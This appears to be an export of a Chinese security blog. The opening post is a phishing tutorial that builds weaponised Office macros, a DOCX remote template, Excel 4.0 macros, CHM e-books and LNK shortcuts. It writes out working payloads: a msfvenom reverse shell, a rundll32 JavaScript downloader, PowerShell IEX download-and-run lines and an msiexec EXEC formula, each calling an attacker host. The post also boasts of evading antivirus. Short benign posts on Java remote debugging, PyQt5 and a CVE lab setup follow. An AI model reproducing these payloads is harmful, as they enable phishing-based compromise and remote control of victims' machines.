title=\"测试宏\"></a>测试宏</h4><p>将文件发送给受害者，如果受害者打开。</p>\n<p><img src=\"HrcPUxV-Rw2oMTgJh0aknD-P-ZM76mARuaPQlaEtME0.png\" alt=\"image\"></p>\n<p>提示宏被禁用 如果用户点击启动内容。Cobal tstrike 就会获得受害人的 beacon</p>\n<p><img src=\"wO5km9NYJMjeJs89n3Qn1BAH-omuJFxrL3CXNFOBH-E.png\" alt=\"image\"></p>\n<p>可以看到受害者已经中了后门，可以对用户进行其他方面的操作。</p>\n<h3 id=\"利用DOCX文档远程模板注入执行宏\"><a href=\"#利用DOCX文档远程模板注入执行宏\" class=\"headerlink\" title=\"利用DOCX文档远程模板注入执行宏\"></a>利用DOCX文档远程模板注入执行宏</h3><p>与传统的宏启用文档相比，这种攻击的好处是多方面的。在对目标执行网络钓鱼攻击时，您可以将.docx的文档直接附加到电子邮件中，并且您不太可能根据文件的拓展名去阻止它。许多组织机构阻止以.doc或.docm为拓展名的文档却允许.docx文档，是因为它们不会包含宏。这种攻击更常见另一个原因可能是因为附件本身不包含恶意代码，任何静态电子邮件扫描程序都不会看到宏本身，因此不太可能被阻止。从而能过很多静态的检测。</p>\n<h4 id=\"方法：\"><a href=\"#方法：\" class=\"headerlink\" title=\"方法：\"></a>方法：</h4><p>想要开始此攻击，我们需要创建两个不同的文件。第一个是启用宏的模板，或是.dotm文件，它将包含恶意VBA宏。第二个是看似没有危害的.docx文件，它本身不包含恶意代码，只有指向恶意模板文件的目标链接。</p>\n<p> 1.创建 dotm 文件</p>\n<p>新建文件 docx 文件 选择 VIsual Basi</p>\n<p><img src=\"ZTq3iSDLceIsPEvEEDODtnM5HypgCkEl1wYZG2lXOJs.png\" alt=\"image\"></p>\n<p>2.双击ThisDocument，把CS的代码粘贴到里面，另存为dotm文件</p>\n<p><img src=\"n1RRdfzheN-xSY2TsNCiOF2TDh12712uIxUOcKEUK7Y.png\" alt=\"image\"></p>\n<p><img src=\"2FMXm8Y47t1deXfcZMNmoyfFx7JKM-2O7EfDybjx6Go.png\" alt=\"image\"></p>\n<p><img src=\"umqEZl1DIN_rH1Ihut_Ox0NxXwFtjWL3zLbEMCH4Ceo.png\" alt=\"image\"></p>\n<p>3.将文件上传到攻击者服务器，使用python启动web服务</p>\n<p>python3 -m http.server 8877</p>\n<p><img src=\"aYTp4HoBaDIAiXhaWR6xdgND4xYk0sS9jjYsCCUoZB4.png\" alt=\"image\"></p>\n<p>4.创建一个正常的word文件，在开始处，选择一个模板</p>\n<p><img src=\"C2p2dzkKDt8ksgTeJHGQzcBW0vHZI9iBaFOhMdnaEz0.png\" alt=\"image\"></p>\n<p>5.将其后缀改成zip，然后解压，修改 word\\_rels\\settings.xml.rels 里的 Target 改成 dotm 文件的访问网址</p>\n<p><img src=\"Fp96vOP_oNKSqnE_ELWemf_8EGXwqJed6Fns6hcNL60.png\" alt=\"image\"></p>\n<p>6.再次压缩之后，将其改为正常的docx文档，必需要在此目录全选之后压缩</p>\n<p><img src=\"wrwt1fQ_ND59KRLMqUjWDVOBs5RL4kr8HP-QUEjuWY4.png\" alt=\"image\"></p>\n<p>7.执行测试</p>\n<p>将文档发送给受害者之后，docx 文件是会从远程加载的宏文件，这时候需要点击是</p>\n<p><img src=\"z8PMGP3nyr1pWsHbdScuQtI5sgPZKeLdvOy1D1eHWmc.png\" alt=\"image\"></p>\n<p>8.启用文件后 就会获得受害者的用户权限。这种方法 docx 避免杀毒软件查杀，而 且隐蔽</p>\n<p><img src=\"vDpvskk8TzcDI8lkTrUq8Cmu_q1rLm9EPpQGymXLSlc.png\" alt=\"image\"></p>\n<h3 id=\"Excel的展示\"><a href=\"#Excel的展示\" class=\"headerlink\" title=\"Excel的展示\"></a>Excel的展示</h3><p>Excel跟 word文档 一样都是支持宏，所以一样存在宏病毒。当我们把恶意的宏代码嵌入 Excel 中，用户打开 Excel 文件里的宏就会被触发。</p>\n<p>metasplosit 生成 msi 文件 </p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/meterpreter/reverse_tcp lhost=<span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.133</span> lport=<span class=\"number\">3223</span> -f msi -o hack.msi</span><br></pre></td></tr></table></figure>\n<p>开启监听器</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload windows/meterpreter/reverse_tcp</span><br><span class=\"line\">set lhost <span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.133</span></span><br><span class=\"line\">set lport <span class=\"number\">3223</span></span><br><span class=\"line\">exploit -j</span><br></pre></td></tr></table></figure>\n<p>打开 excel 底部右键插入宏表</p>\n<p><img src=\"L9xvgU5gXGiI0RHfm6WBM9Vfqg1VegYhOhYt1e44Tc0.png\" alt=\"image\"></p>\n<p>简单演示打开以下计算器</p>\n<p>=EXEC(“calc.exe”)</p>\n<p><img src=\"xK8yEFcS82p2wT08hlxPa6EnmNbGNl4w7mrg_IHOgeA.png\" alt=\"image\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">=EXEC(<span class=\"string\">&quot;msiexec /q /i http://192.168.88.133:8877/hack.msi&quot;</span>) </span><br><span class=\"line\">=HALT() </span><br></pre></td></tr></table></figure>\n<p>更改单元格名为 Auto_Open</p>\n<p><img src=\"oOcJQwd6CMKQbLy_588JGRH9H9xi5crPXuRDhPvjHMk.png\" alt=\"image\"></p>\n<p>隐藏起来</p>\n<p><img src=\"Zn9W-bhZIsstVdhFPxPPSOilwwsMJRIicpeeY393laI.png\" alt=\"image\"></p>\n<p>保存为22.xlsm</p>\n<p><img src=\"7LL1ngMH_RPm28VLMSQBvI9Kkrq-60StyoEsZ3pGtJ0.png\" alt=\"image\"></p>\n<p>双击打开后，宏会恶意请求远程服务器 msi 文件自动下载运行。</p>\n<p><img src=\"IUiamL1pK5BP43z62UHsuSdkWFpIlf1PzMcCrGLGX4Q.png\" alt=\"image\"></p>\n<p>成功上线</p>\n<p><img src=\"NE4nghN3iaPKBqpfU94BM0GDF_olwRkjGlQZykvN0co.png\" alt=\"image\"></p>\n<h3 id=\"CHM文档\"><a href=\"#CHM文档\" class=\"headerlink\" title=\"CHM文档\"></a>CHM文档</h3><h4 id=\"CHM介绍\"><a href=\"#CHM介绍\" class=\"headerlink\" title=\"CHM介绍\"></a>CHM介绍</h4><p>CHM（Compiled Help Manual）即“已编译的帮助文件”。它是微软新一代 的帮助文件格式，利用 HTML 作源文，把帮助内容以类似数据库的形式编译储 存。CHM 支持 Javascript、VBscript、ActiveX、Java Applet、Flash、常见图形文 件(GIF、JPEG、PNG)、音频视频文件(MID、WAV、AVI)等等，并可以通过 URL 与 Internet 联系在一起。因为使用方便，形式多样也被采用作为电子书的格式。 Chm 文件因何变得危险，此文件可以被植入可执行代码。成功的利用需要欺骗用户打开恶意的CHM文件，该文件可用于执行恶意代码。其缺点就是打开时会出现弹黑框、卡顿，容易被察觉。</p>\n<p>在正式打造我们的电子书木马前，我们先分析一下它的“优点”吧！ </p>\n<p>一：因为电子书一般是在本地电脑域打开的，因此它所获得的权限也是本地 电脑域的权限，所以比起网页木马的 Internet 域来，让木马获得执行的机会要简 单的多,“不必使用漏洞”就可以执行，从而也就不会被杀毒软件查杀，如果你 的木马程序够好的话。也不必担心别人打了补丁。 </p>\n<p>二：现在的网页木马由于影响力太大，一般的人上网都会小心三分提防的， 且它依赖于漏洞，所以生存的空间正在逐渐缩小，与此相反的是电子书的火爆下 载，使得电子书木马的传播能力以及范围大大加强。</p>\n<p> 三：由于木马程序嵌入电子书里，一般的杀毒软件无法对其中存在的木马病 毒等破坏性程序进行检查和清除，至少我还没发现有哪个软件可以做到这点，而且如果对这类电子书进行检查，杀毒所需时间也会过长。 </p>\n<p>四：还有最后一点就是，网页木马一般都要自己辛辛苦苦的去传播，并且站点随时可能被关闭，而电子书却可以让许多大的下载站点做贡献。获得长久时间 的传播，当然前提是这本电子书够精彩。 </p>\n<h4 id=\"制作-chm-钓鱼文件\"><a href=\"#制作-chm-钓鱼文件\" class=\"headerlink\" title=\"制作 chm 钓鱼文件\"></a>制作 chm 钓鱼文件</h4><p>项目地址 <a href=\"https://github.com/Ridter/MyJSRat\">https://github.com/Ridter/MyJSRat</a> </p>\n<p>这个工具是用 python2 编写，脚本修改分为两个模式，交互模式以及执行命令模 式。大多数情况使用交互模式。</p>\n<h4 id=\"本地监听\"><a href=\"#本地监听\" class=\"headerlink\" title=\"本地监听\"></a>本地监听</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">python MyJSRat.py -i <span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.133</span> -p <span class=\"number\">8085</span></span><br></pre></td></tr></table></figure>\n<p>访问：<a href=\"http://192.168.88.133:8085/wtf\">http://192.168.88.133:8085/wtf</a>  ，访问 wft 这就是恶意代码可以嵌入 chm 电子书里，注意：需要在rundll32.exe后添加一个逗号</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">rundll32.exe javascript:<span class=\"string\">&quot;\\..\\mshtml,RunHTMLApplication &quot;</span>;document.write();h=<span class=\"keyword\">new</span>%20ActiveXObject(<span class=\"string\">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>);h.Open(<span class=\"string\">&quot;GET&quot;</span>,<span class=\"string\">&quot;http://192.168.88.133:8084/connect&quot;</span>,<span class=\"literal\">false</span>);<span class=\"keyword\">try</span>&#123;h.Send();b=h.ResponseText;eval(b);&#125;<span class=\"keyword\">catch</span>(e)&#123;<span class=\"keyword\">new</span>%20ActiveXObject(<span class=\"string\">&quot;WScript.Shell&quot;</span>).Run(<span class=\"string\">&quot;cmd /c taskkill /f /im rundll32.exe&quot;</span>,<span class=\"number\">0</span>,<span class=\"literal\">true</span>);&#125;</span><br></pre></td></tr></table></figure>\n\n\n<h4 id=\"制作-chm-电子书\"><a href=\"#制作-chm-电子书\" class=\"headerlink\" title=\"制作 chm 电子书\"></a>制作 chm 电子书</h4><p>Easy CHM 是一款 CHM 电子书或 CHM 帮助文件的制作工具，只需三步即可完 成 CHM 的制作，用户只需指定相应目录，该软件将会导入该文件夹内所有文件， 然后用户就可以设置 CHM 编译选项、开始制作。EasyCHM 可用于个人或者单 位制作高压缩比的带有全文检索及高亮显示搜索结果的网页集锦、CHM 帮助文 件、专业的产品说明、公司介绍、CHM 电子书等等</p>\n<h4 id=\"钓鱼-payloay\"><a href=\"#钓鱼-payloay\" class=\"headerlink\" title=\"钓鱼 payloay\"></a>钓鱼 payloay</h4><p>将下面的payload保存为html文件放到一个文件夹中</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;diaoyuceshi&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;</span><br><span class=\"line\">shuoming </span><br><span class=\"line\">&lt;OBJECT id=x classid=<span class=\"string\">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> width=<span class=\"number\">1</span> height=<span class=\"number\">1</span>&gt;</span><br><span class=\"line\">&lt;PARAM name=<span class=\"string\">&quot;Command&quot;</span> value=<span class=\"string\">&quot;ShortCut&quot;</span>&gt;</span><br><span class=\"line\"> &lt;PARAM name=<span class=\"string\">&quot;Button&quot;</span> value=<span class=\"string\">&quot;Bitmap::shortcut&quot;</span>&gt;</span><br><span class=\"line\"> &lt;PARAM name=<span class=\"string\">&quot;Item1&quot;</span> value=<span class=\"string\">&#x27;,calc.exe&#x27;</span>&gt;</span><br><span class=\"line\"> &lt;PARAM name=<span class=\"string\">&quot;Item2&quot;</span> value=<span class=\"string\">&quot;273,1,1&quot;</span>&gt;</span><br><span class=\"line\">&lt;/OBJECT&gt;</span><br><span class=\"line\">&lt;SCRIPT&gt;</span><br><span class=\"line\">x.Click();</span><br><span class=\"line\">&lt;/SCRIPT&gt;</span><br><span class=\"line\">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>打开 Easy CHM 新建-&gt;浏览-&gt;选择目录</p>\n<p>编译根据需求设置好选项后，生成chm 即可。</p>\n<p><img src=\"6PC5JECXeAQEM71bX2knHmqmG1W2bGP4W8JYTGIGSXo.png\" alt=\"image\"></p>\n<p><img src=\"sCO9R7KhhakCDLKO9DSAqARk2qncoQ5nXhqzsfj5BuA.png\" alt=\"image\"></p>\n<p>当受害人打开制作有后门的 chm 电子书，即可获取受害者的权限</p>\n<p><img src=\"kobWMzH_8Ko0CfYy12_inN2WD517vtTBNX7JtCNo5Nc.png\" alt=\"image\"></p>\n<p>结果</p>\n<p><img src=\"DBggTxpfoVfNCmzhYLLL-2hRsms8yIpkgM5wSudW_uE.png\" alt=\"image\"></p>\n<h3 id=\"LNK文件\"><a href=\"#LNK文件\" class=\"headerlink\" title=\"LNK文件\"></a>LNK文件</h3><p>LNK（快捷方式或符号链接）是引用其他文件或程序的方法，最著名的就是震网病毒（Stuxnet）中的利用，在最新的利用样本也有很多。</p>\n<h4 id=\"钓鱼制作\"><a href=\"#钓鱼制作\" class=\"headerlink\" title=\"钓鱼制作\"></a>钓鱼制作</h4><p>1.生成powershell上线的payload </p>\n<p><img src=\"tAakx0BtFb69GiGMShQ0qPJmwwFH6iNQHTRS1fmhX6w.png\" alt=\"image\"></p>\n<p>选择监听器</p>\n<p><img src=\"GDHkP8nbizBNINmwPrCXZ5equs5rxXVoCi9z6GkaLXc.png\" alt=\"image\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">powershell.exe -nop -w hidden -c <span class=\"string\">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.88.133:80/a&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>\n<p>在桌面创建快捷方式 右键 目标填写 payload </p>\n<p><img src=\"ICdLQ7KzJfJnqYXacCqH0zHX6K1Diw6Y9AxqjjaXAvY.png\" alt=\"image\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Windows\\System32\\WindowsPowerShell\\v1<span class=\"number\">.0</span>\\powershell.exe -nop -w hidden -c <span class=\"string\">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.88.133:80/b&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"TKT4ANyuPp-rJ1C1nO-lzo6o8R02BpSeCFL907EUR6s.png\" alt=\"image\"></p>\n<p><img src=\"RCAeFyZToJ95KrOeI4CkxrfpUegEmH29Z02eYiMshsE.png\" alt=\"image\"></p>\n<h4 id=\"更改图标\"><a href=\"#更改图标\" class=\"headerlink\" title=\"更改图标\"></a>更改图标</h4><p>为了让快捷方式伪装的像诱导文件，可以选择更改图标 </p>\n<p><img src=\"iJVsISWekpSaTxEy65j6nCaRe1dsoNNmAfhihPrixBA.png\" alt=\"image\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">%SystemRoot%\\System32\\SHELL32.dll</span><br></pre></td></tr></table></figure>\n<p>当受害者双击打开 就是执行恶意的 powershell</p>\n<p><img src=\"Ol-aCDDo1BNfT0VAODYLdAG3RF6DRvCIjNN2P44EQiA.png\" alt=\"image\"></p>\n<p><img src=\"otacHGNOWCO4e5eKYz-2WPNgsbgPE4n3bmOk_SYRxAE.png\" alt=\"image\"></p>\n<h3 id=\"克隆网站\"><a href=\"#克隆网站\" class=\"headerlink\" title=\"克隆网站\"></a>克隆网站</h3>","categories":["原创培训课件"],"tags":["钓鱼技巧"]},{"title":"idea远程调试Java项目","url":"/2023/05/24/idea%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95Java%E9%A1%B9%E7%9B%AE/","content":"<h1 id=\"idea远程调试Java项目\"><a href=\"#idea远程调试Java项目\" class=\"headerlink\" title=\"idea远程调试Java项目\"></a>idea远程调试Java项目</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>有时候需要分析排查远程的jar的时候，就需要用到了idea的远程调试分析，下面学习一下这个分析的过程，这里以SpringBoot项目为案例，进行简单学习记录一下。</p>\n<h3 id=\"打包\"><a href=\"#打包\" class=\"headerlink\" title=\"打包\"></a>打包</h3><p>使用SpringBoot自带一个插件来打包，在pom.xml中添加如下内容即可</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;project&gt;</span><br><span class=\"line\">    &lt;build&gt;</span><br><span class=\"line\">        &lt;plugins&gt;</span><br><span class=\"line\">            &lt;plugin&gt;</span><br><span class=\"line\">                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;/plugin&gt;</span><br><span class=\"line\">        &lt;/plugins&gt;</span><br><span class=\"line\">    &lt;/build&gt;</span><br><span class=\"line\">&lt;/project&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>直接执行maven打包</p>\n<p><img src=\"GQHA_ZG4is4LLDCU_VrLzczejr7G_yYd3CKyGB4cgNo.png\" alt=\"image\"></p>\n<p>项目跑起来：java -jar xxx.jar</p>\n<p><img src=\"8xeiYVQ1LfupfXdhfAFPgBO3l5TlQE16UifrzTJddlo.png\" alt=\"image\"></p>\n<h2 id=\"调试配置\"><a href=\"#调试配置\" class=\"headerlink\" title=\"调试配置\"></a>调试配置</h2><p>下面进行远程调试配置</p>\n<p>1.编辑配置</p>\n<p><img src=\"e-0kBAdde4JCPvcXXFUCQFmr70Tyxpr6cnVMPTQKTto.png\" alt=\"image\"></p>\n<p>2.选择远程jvm（remote）</p>\n<p><img src=\"3bi1WXe26pFicZrhF7LhQDYHsZ5jgCjiQQ7-icUcRRE.png\" alt=\"image\"></p>\n<p>3.填写配置信息</p>\n<p><img src=\"U_GgwEJeRnpzWh73QbMUc7TLV44x2tTeuESQ3HsbrOA.png\" alt=\"image\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=<span class=\"number\">50055</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"启动项目\"><a href=\"#启动项目\" class=\"headerlink\" title=\"启动项目\"></a>启动项目</h2><p>Linux or Mac</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">nohup java \\</span><br><span class=\"line\">-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=<span class=\"number\">50055</span> \\</span><br><span class=\"line\">-jar Thymeleaf_SSTI.jar &amp;</span><br></pre></td></tr></table></figure>\n<p>Windows</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">java ^</span><br><span class=\"line\">-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=<span class=\"number\">50055</span> ^</span><br><span class=\"line\">-jar Thymeleaf_SSTI.jar.jar</span><br></pre></td></tr></table></figure>\n<p>注意⚠️</p>\n<ul>\n<li>端口可以随意，但需要保持一致</li>\n<li>代码和所运行的jar也需要保持一致</li>\n<li>添加<code>nohup</code> 和 <code>&amp;是为了在后台运行</code></li>\n</ul>\n<p>启动</p>\n<p><img src=\"44yI2e4HoPXFCW-55wkOrTs_jchMYLRMS2q-9BK0880.png\" alt=\"image\"></p>\n<p>idea直接启动dbug之后，在浏览器访问一下页面。成功断点</p>\n<p><img src=\"oNrWntEktZUK-O1ack9jELuaRYBuNTpEhDYNfjnySxM.png\" alt=\"image\"></p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ul>\n<li>idea停止，远程jar还是可以继续运行的。</li>\n<li>jar包代码和本地不一致会导致项目起不来。</li>\n<li>System.out 以及 log.info 还是打印在远程的。</li>\n</ul>\n","categories":["代码审计"],"tags":["Java"]},{"title":"pyqt5实现列表的按钮切换页面","url":"/2022/11/10/pyqt5%E5%AE%9E%E7%8E%B0%E5%88%97%E8%A1%A8%E7%9A%84%E6%8C%89%E9%92%AE%E5%88%87%E6%8D%A2%E9%A1%B5%E9%9D%A2/","content":"<h1 id=\"pyqt5实现列表的按钮切换页面\"><a href=\"#pyqt5实现列表的按钮切换页面\" class=\"headerlink\" title=\"pyqt5实现列表的按钮切换页面\"></a>pyqt5实现列表的按钮切换页面</h1><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">from</span> PyQt5 <span class=\"keyword\">import</span> QtCore, QtGui, QtWidgets</span><br><span class=\"line\"><span class=\"keyword\">from</span> PyQt5.QtCore <span class=\"keyword\">import</span> Qt</span><br><span class=\"line\"><span class=\"keyword\">from</span> PyQt5.QtGui <span class=\"keyword\">import</span> QIcon</span><br><span class=\"line\"><span class=\"keyword\">from</span> PyQt5.QtWidgets <span class=\"keyword\">import</span> (QApplication, QMainWindow, QStackedLayout, QWidget,</span><br><span class=\"line\">                             QToolBar, QToolButton, QStyle, QColorDialog, QFontDialog,</span><br><span class=\"line\">                             QVBoxLayout, QGroupBox, QRadioButton)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">DemoStackedLayout</span>(<span class=\"title class_ inherited__\">QMainWindow</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, parent=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(DemoStackedLayout, self).__init__(parent)</span><br><span class=\"line\">        <span class=\"comment\"># 设置窗口标题</span></span><br><span class=\"line\">        self.setWindowTitle(<span class=\"string\">&#x27;实战PyQt5: QStackedLayout Demo!&#x27;</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 设置窗口大小</span></span><br><span class=\"line\">        <span class=\"comment\">#self.resize(480, 360)</span></span><br><span class=\"line\">        self.resize(<span class=\"number\">480</span>, <span class=\"number\">360</span>)</span><br><span class=\"line\">        self.initUi()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">initUi</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        toolBar = QToolBar(self)</span><br><span class=\"line\">        self.addToolBar(Qt.LeftToolBarArea, toolBar)</span><br><span class=\"line\"></span><br><span class=\"line\">        btnColor = self.createButton(<span class=\"string\">&#x27;颜色对话框&#x27;</span>)</span><br><span class=\"line\">        btnColor.clicked.connect(<span class=\"keyword\">lambda</span>: self.onButtonClicked(<span class=\"number\">0</span>))</span><br><span class=\"line\">        toolBar.addWidget(btnColor)</span><br><span class=\"line\">        btnFont = self.createButton(<span class=\"string\">&#x27;字体对话框&#x27;</span>)</span><br><span class=\"line\">        btnFont.clicked.connect(<span class=\"keyword\">lambda</span>: self.onButtonClicked(<span class=\"number\">1</span>))</span><br><span class=\"line\">        toolBar.addWidget(btnFont)</span><br><span class=\"line\">        btnUser = self.createButton(<span class=\"string\">&#x27; 分组部件&#x27;</span>)</span><br><span class=\"line\">        btnUser.clicked.connect(<span class=\"keyword\">lambda</span>: self.onButtonClicked(<span class=\"number\">2</span>))</span><br><span class=\"line\">        toolBar.addWidget(btnUser)</span><br><span class=\"line\"></span><br><span class=\"line\">        mainWidget = QWidget(self)</span><br><span class=\"line\"></span><br><span class=\"line\">        self.mainLayout = QStackedLayout(mainWidget)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 添加三个widget,演示三个页面之间的切换</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 颜色对话框</span></span><br><span class=\"line\">        self.mainLayout.addWidget(QColorDialog(self))</span><br><span class=\"line\">        <span class=\"comment\"># 字体对话框</span></span><br><span class=\"line\">        self.mainLayout.addWidget(QFontDialog(self))</span><br><span class=\"line\">        <span class=\"comment\"># 自定义控件</span></span><br><span class=\"line\">        self.mainLayout.addWidget(self.createExclusiveGroup())</span><br><span class=\"line\"></span><br><span class=\"line\">        mainWidget.setLayout(self.mainLayout)</span><br><span class=\"line\">        <span class=\"comment\"># 设置中心窗口</span></span><br><span class=\"line\">        self.setCentralWidget(mainWidget)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">createButton</span>(<span class=\"params\">self, text</span>):</span><br><span class=\"line\">        icon = QApplication.style().standardIcon(QStyle.SP_DesktopIcon)</span><br><span class=\"line\">        btn = QToolButton(self)</span><br><span class=\"line\">        btn.setText(text)</span><br><span class=\"line\">        btn.setIcon(icon)</span><br><span class=\"line\">        btn.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> btn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">onButtonClicked</span>(<span class=\"params\">self, index</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> index &lt; self.mainLayout.count():</span><br><span class=\"line\">            self.mainLayout.setCurrentIndex(index)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> index ==<span class=\"number\">0</span>:</span><br><span class=\"line\">                self.resize(<span class=\"number\">580</span>, <span class=\"number\">360</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> index ==<span class=\"number\">1</span>:</span><br><span class=\"line\">                self.resize(<span class=\"number\">680</span>, <span class=\"number\">360</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> index ==<span class=\"number\">2</span>:</span><br><span class=\"line\">                self.resize(<span class=\"number\">780</span>, <span class=\"number\">360</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">createExclusiveGroup</span>(<span class=\"params\">self</span>):<span class=\"comment\">#QTabWidget</span></span><br><span class=\"line\">        groupBox = QGroupBox(<span class=\"string\">&#x27;Exclusive Radio Buttons&#x27;</span>, self)</span><br><span class=\"line\">        radio1 = QRadioButton(<span class=\"string\">&#x27;&amp;Radio Button 1&#x27;</span>, self)</span><br><span class=\"line\">        radio1.setChecked(<span class=\"literal\">True</span>)</span><br><span class=\"line\">        radio2 = QRadioButton(<span class=\"string\">&#x27;R&amp;adio button 2&#x27;</span>, self)</span><br><span class=\"line\">        radio3 = QRadioButton(<span class=\"string\">&#x27;Ra&amp;dio button 3&#x27;</span>, self)</span><br><span class=\"line\"></span><br><span class=\"line\">        vLayout = QVBoxLayout(groupBox)</span><br><span class=\"line\">        vLayout.addWidget(radio1)</span><br><span class=\"line\">        vLayout.addWidget(radio2)</span><br><span class=\"line\">        vLayout.addWidget(radio3)</span><br><span class=\"line\">        vLayout.addStretch(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        groupBox.setLayout(vLayout)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> groupBox</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    app = QApplication(sys.argv)</span><br><span class=\"line\">    window = DemoStackedLayout()</span><br><span class=\"line\">    window.show()</span><br><span class=\"line\">    sys.exit(app.<span class=\"built_in\">exec</span>())</span><br></pre></td></tr></table></figure>\n\n\n<p><img src=\"4nAjrgwaN5coGfTS9W-8PyE5OzkSFTrO_R4K3EWnARA.png\" alt=\"image\"></p>\n<p><img src=\"KPWLJP3P2DvQRTFnDRIa-dE67sWHNUbicHLqnzMUHjs.png\" alt=\"image\"></p>\n<p><img src=\"XvBLsXHK2bYFz-T0I8_ZtiUOAAfFEVhMM4BFYCbZXyE.png\" alt=\"image\"></p>\n","categories":["python开发"],"tags":["python","pyqt"]},{"title":"spring-spel复现（CVE-2022-22963）","url":"/2022/05/06/spring-spel%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2022-22963%EF%BC%89/","content":"<h1 id=\"spring-spel复现（CVE-2022-22963）\"><a href=\"#spring-spel复现（CVE-2022-22963）\" class=\"headerlink\" title=\"spring-spel复现（CVE-2022-22963）\"></a>spring-spel复现（CVE-2022-22963）</h1><h2 id=\"CVE-2022-22963\"><a href=\"#CVE-2022-22963\" class=\"headerlink\" title=\"CVE-2022-22963\"></a>CVE-2022-22963</h2><p>Spring Cloud Function 是基于 Spring Boot 的函数计算框架，它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。<br>由于Spring Cloud Function中RoutingFunction类的apply方法将请求头中的“spring.cloud.function.routing-expression”参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞，攻击者可利用该漏洞远程执行任意代码。</p>\n<h2 id=\"影响版本\"><a href=\"#影响版本\" class=\"headerlink\" title=\"影响版本\"></a>影响版本</h2><p>3.0.0.RELEASE &lt;&#x3D; Spring Cloud Function &lt;&#x3D; 3.2.2</p>\n<h2 id=\"环境搭建：\"><a href=\"#环境搭建：\" class=\"headerlink\" title=\"环境搭建：\"></a>环境搭建：</h2><figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">wget https://github.com/spring-cloud/spring-cloud-function/archive/refs/tags/v3.1.6.zip</span><br><span class=\"line\">unzip v3.1.6.zip</span><br><span class=\"line\">cd spring-cloud-function-3.1.6</span><br><span class=\"line\">cd spring-cloud-function-samples/function-sample-pojo</span><br><span class=\"line\">mvn package</span><br><span 